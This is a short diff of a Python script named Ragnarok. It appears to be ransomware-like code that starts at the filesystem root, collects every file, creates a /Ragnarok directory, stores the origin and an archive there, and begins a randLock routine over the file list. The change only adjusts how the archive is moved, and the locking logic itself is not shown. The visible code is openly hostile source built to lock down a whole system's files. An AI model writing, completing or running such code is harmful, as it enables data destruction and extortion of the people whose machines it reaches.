@@ -2,8 +2,6 @@ import os
 import sys
 import subprocess
 self = sys.argv[0]
-num = (len(self) - 1) - 7
-selfPath = self[:num]
 origin = "/" #This will set the highest directory with which to lock down
 def main():
     fileList = findFiles(origin)
@@ -14,7 +12,7 @@ def main():
     os.system("mkdir /Ragnarok")
     os.system("touch /Ragnarok/directory")
     os.system('echo "' + origin + '" >> /Ragnarok/directory')
-    os.system("mv " + selfPath + "Ragnarok.zip /Ragnarok/zip.zip")
+    os.system("mv Ragnarok.zip /Ragnarok/")
     
 def randLock(fileList):
     for file in fileList:
